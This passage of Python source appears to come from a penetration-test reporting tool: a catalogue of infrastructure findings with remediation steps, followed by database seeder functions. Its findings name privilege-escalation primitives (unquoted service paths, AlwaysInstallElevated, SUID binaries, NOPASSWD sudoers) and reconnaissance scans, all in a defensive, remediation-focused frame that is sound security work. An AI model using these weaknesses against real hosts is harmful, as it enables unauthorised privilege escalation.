            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "SSL / TLS Misconfigurations (Grouped)", "Medium",
            description="It was noted that the affected hosts were running services with one or more weak SSL / TLS configurations — including expired or untrusted certificates, self-signed certificates, weak CBC cipher suites, deprecated TLS 1.0 / 1.1 protocols, weak hashing algorithms, and missing forward secrecy. The full list of affected hosts, ports, and the specific weakness on each is provided in the attached workbook.",
            impact="Weak SSL / TLS configurations allow a network attacker to downgrade connections, recover plaintext via padding-oracle or chosen-ciphertext attacks, impersonate the service to legitimate clients, or extract session material from intercepted traffic. The same misconfiguration also fails most modern compliance baselines (PCI-DSS, MAS TRM, ISO 27001), so affected services cannot be considered compliant until each row in the attached workbook is closed.",
            remediation="It is recommended to re-issue every expired, untrusted, or self-signed certificate from a recognised certificate authority and serve the full chain, pin every service to TLS 1.2 or 1.3 with authenticated-encryption (AEAD) cipher suites only, disable CBC mode and TLS 1.0 / 1.1 entirely, and rotate weak signing material to at least 2048-bit RSA or ECDSA. Apply a server-wide hardening profile (e.g. the Mozilla Server-Side TLS \"Intermediate\" template) and re-test with testssl.sh or nmap --script ssl-enum-ciphers afterwards.",
            references="https://wiki.mozilla.org/Security/Server_Side_TLS\nhttps://datatracker.ietf.org/doc/html/rfc8996\nhttps://cwe.mitre.org/data/definitions/327.html",
            cwe="CWE-327", owasp="A02:2021",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Information Disclosure via Service Banners (Grouped)", "Low",
            description="It was noted that the affected hosts were leaking implementation detail through their service banners, version strings, or default response content — including HTTP `Server` / `X-Powered-By` headers, SSH and SMTP banners exposing the underlying operating system or product build, directory listings, default landing pages, and verbose error pages containing stack traces. The full list of affected hosts, ports, and the specific information disclosed on each is provided in the attached workbook.",
            impact="Banner disclosure dramatically reduces the cost of a targeted attack: the attacker learns the exact version of every service and only has to enumerate CVEs against that version range. Combined with outdated-software exposure this often hands the attacker a ready exploit chain. Compliance baselines that require minimisation of public-facing detail also fail until the disclosure is suppressed.",
            remediation="It is recommended to suppress or generalise the disclosed detail for every row in the attached workbook — strip `Server` / `X-Powered-By` headers at the reverse proxy, set SSH and SMTP banners to neutral values, disable directory autoindex on web servers, replace default landing pages, and switch the application to production mode so verbose stack traces are logged server-side only. Re-scan and confirm each row in the workbook is closed.",
            references="https://owasp.org/www-community/Improper_Error_Handling\nhttps://cwe.mitre.org/data/definitions/200.html",
            cwe="CWE-200", owasp="A05:2021",
            cvss_score=3.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Insecure Service Configurations (Grouped)", "High",
            description="It was noted that the affected hosts were running services and operating-system components with one or more insecure configurations that an attacker can leverage for local privilege escalation, persistence, or lateral movement. The class covers (but is not limited to): Windows unquoted service paths, services whose binary or containing directory is writable by non-privileged users, weak or overly-permissive service / file / registry ACLs, dangerous registry values (e.g. `AlwaysInstallElevated`, auto-logon credentials in `Winlogon`, insecure `Run`/`RunOnce` keys), Linux SUID/SGID binaries on non-standard executables, world-writable files in privileged paths, mis-set `sudoers` entries, and exposed administrative or debug interfaces left in their default state. The full list — affected host, port/service, the specific misconfiguration observed, and the relevant plugin output evidence — is provided in the attached workbook.",
            impact="Insecure service and OS configurations are the most common local-privilege-escalation primitive on an internal network. An attacker who lands code execution as a low-privileged user (phishing, an exposed app, a weak credential) routinely converts one of these misconfigurations into SYSTEM / root, then uses the elevated host as a pivot into systems that share credentials or a trust relationship. Because the weakness is in configuration rather than a CVE, it is invisible to patch-only programmes and persists across reboots and software updates until the configuration itself is corrected.",
            remediation="Remediate each row in the attached workbook against its specific class: quote every Windows service `ImagePath` and tighten the binary/directory ACLs so only administrators can write; remove or correct dangerous registry values (`AlwaysInstallElevated`=0, no plaintext auto-logon credentials, locked-down `Run`/`RunOnce`); audit and strip unnecessary SUID/SGID bits on Linux (`find / -perm -4000 -type f`) and replace world-writable permissions in privileged paths with least-privilege ownership; constrain `sudoers` to specific commands without `NOPASSWD` where avoidable; and reset any exposed administrative/debug interface to a hardened, authenticated state. Apply a configuration baseline (CIS Benchmark for the relevant OS) and re-scan to confirm every row in the workbook is closed.",
            references="https://attack.mitre.org/tactics/TA0004/\nhttps://cwe.mitre.org/data/definitions/16.html\nhttps://cwe.mitre.org/data/definitions/732.html\nhttps://www.cisecurity.org/cis-benchmarks",
            cwe="CWE-16", owasp="A05:2021",
            cvss_score=7.8,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Weak CBC Ciphers Enabled on SSH Service", "Medium",
            description="The SSH daemon (typically port 22) accepts CBC-mode block ciphers in its server-side cipher list (`aes128-cbc`, `aes192-cbc`, `aes256-cbc`, `3des-cbc`, `blowfish-cbc`). Detected via `ssh -Q cipher` against the server or by inspecting the KEX message during banner exchange (`nmap --script ssh2-enum-algos -p 22 <host>`).\n\nCBC in SSH is associated with the well-known plaintext-recovery attack against SSH binary packet protocol (CPNI-957037, 2008), reliable against ~32 bits of plaintext per session in practical conditions.",
            impact="A network attacker with sustained access to ciphertext can attempt to recover up to 32 bits of plaintext per SSH session. More importantly, CBC suites fail most modern hardening baselines and indicate that the SSH configuration has not been audited against current recommendations.",
            remediation="- Restrict the cipher list to AEAD and CTR-mode suites only. In `/etc/ssh/sshd_config`:\n  ```\n  Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr\n  MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com\n  KexAlgorithms curve25519-sha256@libssh.org,curve25519-sha256,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256\n  HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256\n  ```\n- Reload sshd and re-test with `nmap --script ssh2-enum-algos`.\n- Follow the latest Mozilla OpenSSH Guidelines when the next refresh lands.",
            references="https://www.openssh.com/txt/cbc.adv\nhttps://infosec.mozilla.org/guidelines/openssh\nhttps://cwe.mitre.org/data/definitions/327.html",
            cwe="CWE-327",
            cvss_score=4.8,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "ICMP Timestamp Request Remote Date Disclosure", "Low",
            description="The affected host(s) responded to ICMP Timestamp Request (type 13) messages, returning the host's current time in an ICMP Timestamp Reply (type 14). An unauthenticated remote attacker can query this without any authentication and obtain the system's current time, which may assist in defeating time-based security controls (e.g. TOTP, Kerberos ticket windows) or in correlating events across logs.",
            impact="Disclosure of the system's current time can assist an attacker in refining targeted attacks that rely on time synchronisation, such as bypassing time-window-based one-time password schemes, forging Kerberos tickets, or correlating log timestamps to their own actions. Although the risk in isolation is low, it contributes to the attacker's reconnaissance picture.",
            remediation="Configure host-based or network-based firewall rules to block inbound ICMP type 13 (Timestamp Request) and outbound ICMP type 14 (Timestamp Reply) at the perimeter and on each affected host:\n\n**Linux (iptables):**\n```\niptables -A INPUT -p icmp --icmp-type timestamp-request -j DROP\niptables -A OUTPUT -p icmp --icmp-type timestamp-reply -j DROP\n```\n\n**Linux (ip6tables / nftables):** Apply equivalent rules for the IPv6 table.\n\n**Windows Firewall:** Create an inbound rule to block protocol 1 (ICMP) with specific ICMP types 13 and 14, or use a perimeter firewall ACL to suppress these response types before they leave the network segment.\n\nValidate the fix by re-running the scanner and confirming no ICMP Timestamp Reply is received.",
            references="https://cwe.mitre.org/data/definitions/200.html\nhttps://www.tenable.com/plugins/nessus/10114",
            cwe="CWE-200",
            cvss_score=2.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "IP Forwarding Enabled", "Medium",
            description="IP forwarding (also called IP routing) was found to be enabled on the affected host(s). When IP forwarding is active, the host will route packets between network interfaces, effectively acting as a router. Unless the host is explicitly deployed as a routing device, this capability should be disabled. An attacker who obtains code execution on the host can leverage IP forwarding to reach otherwise-isolated network segments, bypass network segmentation controls, or set up covert tunnels.",
            impact="An attacker with access to the affected host can use it as an unauthorised router or tunnel endpoint to reach internal network segments that are not directly accessible. This undermines network segmentation and can allow lateral movement to systems behind firewalls or VLANs that are intended to be isolated from the attacker's entry point.",
            remediation="Disable IP forwarding on all hosts that are not explicitly designated as network routers or VPN gateways:\n\n**Linux (immediate, non-persistent):**\n```\necho 0 > /proc/sys/net/ipv4/ip_forward\necho 0 > /proc/sys/net/ipv6/conf/all/forwarding\n```\n\n**Linux (persistent via sysctl):**\nAdd or update the following lines in `/etc/sysctl.conf` (or a file under `/etc/sysctl.d/`):\n```\nnet.ipv4.ip_forward = 0\nnet.ipv6.conf.all.forwarding = 0\n```\nApply with `sysctl -p`.\n\n**Windows:**\nSet the registry value `HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter` to `0` and reboot, or run:\n```\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v IPEnableRouter /t REG_DWORD /d 0 /f\n```\n\nVerify the change by re-scanning and confirming the plugin no longer reports IP forwarding as enabled.",
            references="https://cwe.mitre.org/data/definitions/16.html\nhttps://www.tenable.com/plugins/nessus/50686",
            cwe="CWE-16", owasp="A05:2021",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Windows Speculative Execution Configuration Check", "Medium",
            description="The affected Windows host(s) have not been fully configured with the vendor-recommended mitigations for speculative-execution side-channel vulnerabilities (Spectre variant 1/2, Meltdown / variant 3, Speculative Store Bypass / variant 4, L1TF / Foreshadow, MDS, and related classes). These vulnerabilities abuse CPU speculative-execution behaviour to leak privileged memory contents across process and privilege boundaries. Microsoft has published a detailed registry-based configuration guide that must be applied in concert with firmware/microcode updates and OS patches to fully close the attack surface.",
            impact="Speculative-execution vulnerabilities can be exploited by a local or, in some configurations, remote attacker to read kernel memory, hypervisor memory, or data from co-resident virtual machines. Sensitive material such as cryptographic keys, credentials, or session tokens resident in kernel structures or other processes can be extracted without any kernel vulnerability.",
            remediation="Apply all three layers of remediation as described in Microsoft KB4072699 and the Windows Server Guidance:\n\n1. **Firmware / microcode update** — Install the latest BIOS/UEFI firmware from the hardware vendor that includes Intel or AMD microcode updates for Spectre v2 / SSBD.\n\n2. **Operating system patches** — Ensure all cumulative updates for the installed Windows version are applied (Windows Update or WSUS).\n\n3. **Registry configuration** — Enable the protections via the following registry keys (create if absent):\n   ```\n   HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\n     FeatureSettingsOverride       = 0 (DWORD)\n     FeatureSettingsOverrideMask   = 3 (DWORD)\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Virtualization\n     MinVmVersionForCpuBasedMitigations = \"1.0\" (REG_SZ)  [Hyper-V hosts only]\n   ```\n\nUse the **Microsoft SpeculationControl** PowerShell module (`Install-Module SpeculationControl; Get-SpeculationControlSettings`) to verify all protections are reported as `True` after the fix. Reboot is required for the registry and firmware changes to take effect.",
            references="https://support.microsoft.com/en-us/topic/kb4072699-intel-microcode-updates-for-windows-10-version-1507-and-later-f85e65ca-5d14-dbe4-05d2-e254c39b9df0\nhttps://cwe.mitre.org/data/definitions/1037.html\nhttps://www.tenable.com/plugins/nessus/100988",
            cwe="CWE-1037",
            cvss_score=5.6,
            cvss_vector="CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Windows Defender Antimalware / Antivirus Signature Definition Out-of-Date", "High",
            description="The Windows Defender Antimalware / Antivirus signature definitions on the affected host(s) are outdated. The installed signature database does not reflect the latest threat intelligence published by Microsoft, leaving the host unable to detect malware, ransomware, and other threats that have been catalogued since the last successful update. Signature currency is a primary control in endpoint protection and is required by most security baselines.",
            impact="An out-of-date signature database means the endpoint protection platform cannot detect or block recently identified malware families, zero-day exploitation payloads, or commodity ransomware variants for which signatures have been released. An attacker deploying any such tooling on the affected host will not be challenged by the installed AV, substantially increasing the probability of a successful and persistent compromise.",
            remediation="**Immediate remediation:**\nTrigger a manual signature update on each affected host:\n```powershell\nUpdate-MpSignature\n```\nor via the Windows Defender Security Center GUI: *Virus & threat protection → Protection updates → Check for updates*.\n\n**Persistent fix — ensure automatic updates are enabled:**\n1. Via Group Policy: `Computer Configuration → Administrative Templates → Windows Components → Microsoft Defender Antivirus → Security Intelligence Updates → Specify the interval to check for security intelligence updates` — set to `1` (hourly).\n2. Via PowerShell:\n```powershell\nSet-MpPreference -SignatureUpdateInterval 1\nSet-MpPreference -SignatureUpdateCatchupInterval 1\n```\n3. Ensure the Windows Update service (`wuauserv`) and the Security Center service (`wscsvc`) are running and set to `Automatic`.\n4. Where a WSUS or SCCM/MECM infrastructure is in use, verify that the definition update packages are approved and being distributed to the affected endpoints.\n\nConfirm by running `Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, AntivirusSignatureVersion` and verifying the signature age is within 24 hours.",
            references="https://learn.microsoft.com/en-us/defender-endpoint/manage-updates-baselines-microsoft-defender-antivirus\nhttps://cwe.mitre.org/data/definitions/1104.html\nhttps://www.tenable.com/plugins/nessus/32314",
            cwe="CWE-1104",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),
    ])

    return F


# ============================================================
# Seeder entry point
# ============================================================

def _ensure_templates(db: Session) -> dict[str, int]:
    """Idempotently ensure every template code in `TEMPLATE_BOOTSTRAP`
    exists in the DB AND reflects the current bootstrap values.

    Two responsibilities:
      1. CREATE rows that don't exist yet.
      2. UPDATE existing rows so the `is_active` flag and the
         canonical `docx_filename` match the source-of-truth list.
         This is what lets a deployed instance "self-activate" newly
         added template types (Wi-Fi / Kiosk / OT / SCR / Cloud) the
         moment they appear in `TEMPLATE_BOOTSTRAP` — without it,
         old DB rows would stay `is_active=False` forever and the
         picker dropdown would never show them.

    Returns a `code -> id` map the seeder consumes.
    """
    code_to_id: dict[str, int] = {}
    for code, name, docx, active in TEMPLATE_BOOTSTRAP:
        existing = db.query(ReportTemplate).filter(ReportTemplate.code == code).first()
        if existing:
            code_to_id[code] = existing.id
            # Reconcile is_active + name + canonical docx_filename so a
            # row that was seeded inactive (or with a stale filename)
            # picks up the current bootstrap values. We DON'T overwrite
            # an admin-customised `docx_filename` — once it diverges
            # from the canonical default, we assume the admin uploaded
            # a replacement via /replace-docx and leave their choice
            # alone.
            dirty = False
            if existing.is_active != active:
                existing.is_active = active; dirty = True
            if not existing.name or existing.name != name:
                # Allow renames in the source list to flow through.
                existing.name = name; dirty = True
            if not existing.docx_filename:
                existing.docx_filename = docx; dirty = True
            if dirty:
                db.add(existing)
            continue
        row = ReportTemplate(
            code=code, name=name, docx_filename=docx,
            description=f"{name} report template (seeded)",
            is_active=active,
        )
        db.add(row); db.flush()
        code_to_id[code] = row.id
    db.commit()
    return code_to_id


def ensure_templates_at_boot() -> dict:
    """Public wrapper for `_ensure_templates`. Called from `main.py`'s
    startup chain so every container boot reconciles the
    `ReportTemplate` table with the current bootstrap list — making
    new VAPT types available in the picker without a manual seed step.
    """
    from .database import SessionLocal
    db = SessionLocal()
    try:
        return _ensure_templates(db)
    finally:
        db.close()


def seed_default_findings(db: Session, *, status: LibraryStatus = LibraryStatus.approved
                           ) -> dict:
    """Insert every catalogue entry whose title doesn't already exist.
    Returns a {created, skipped, total} summary."""
    code_to_id = _ensure_templates(db)
    created = 0
    skipped: list[str] = []
    # Backfill OWASP-2025 onto every existing FindingLibrary row that's
    # missing a category. Runs BEFORE the insert loop so when the loop
    # finds an existing row by title and skips it, the OWASP value the
    # user expects to see is already present on that row. Web VAPT is
    # the priority but other templates benefit too (the helper is
    # CWE/title-keyword driven and edition-agnostic).
    try:
        owasp_backfilled = backfill_owasp_top10_2025(db)
    except Exception as e:                                      # pragma: no cover
        import logging
        logging.getLogger(__name__).warning(
            "OWASP-2025 backfill skipped: %s", e
        )
        owasp_backfilled = 0
    # Assign the correct OWASP taxonomy to API / Mobile / ThickClient findings
    # (separate taxonomy from the Web OWASP Top 10 2025).
    try:
        owasp_backfilled += backfill_template_specific_owasp(db)
    except Exception as e:                                      # pragma: no cover
        import logging
        logging.getLogger(__name__).warning(
            "Template-specific OWASP backfill skipped: %s", e
        )
    for entry in _findings_catalogue():
        primary_code = entry["primary"]
        template_id = code_to_id.get(primary_code)
        if not template_id:
            skipped.append(f"{entry['title']} (no template for {primary_code})")
            continue
        existing = (db.query(FindingLibrary)
                       .filter(FindingLibrary.title == entry["title"])
                       .first())
        if existing:
            # Idempotent: don't overwrite user edits. Just ensure the
            # template:* tags are present so the filter works for legacy rows.
            current_tags = list(existing.tags or [])
            for tag in entry["tags"]:
                if tag not in current_tags:
                    current_tags.append(tag)
            existing.tags = current_tags
            skipped.append(entry["title"])
            continue
        fl = FindingLibrary(
            template_id=template_id,
            title=entry["title"],
            description=entry["description"],
            impact=entry["impact"],
            remediation=entry["remediation"],
            references=entry["references"],
            default_severity=entry["default_severity"],
            default_cvss_vector=entry["default_cvss_vector"] or None,
            default_cvss_score=entry["default_cvss_score"],
            tags=entry["tags"],
            cwe=entry["cwe"] or None,
            owasp_category=entry["owasp_category"] or None,
            status=status,
        )
        db.add(fl)
        created += 1
    db.commit()
    return {
        "created": created,
        "skipped": len(skipped),
        "skipped_titles": skipped[:50],
        "total_catalogue": len(_findings_catalogue()),
        "templates_ensured": list(code_to_id.keys()),
        "owasp_2025_backfilled": owasp_backfilled,
    }
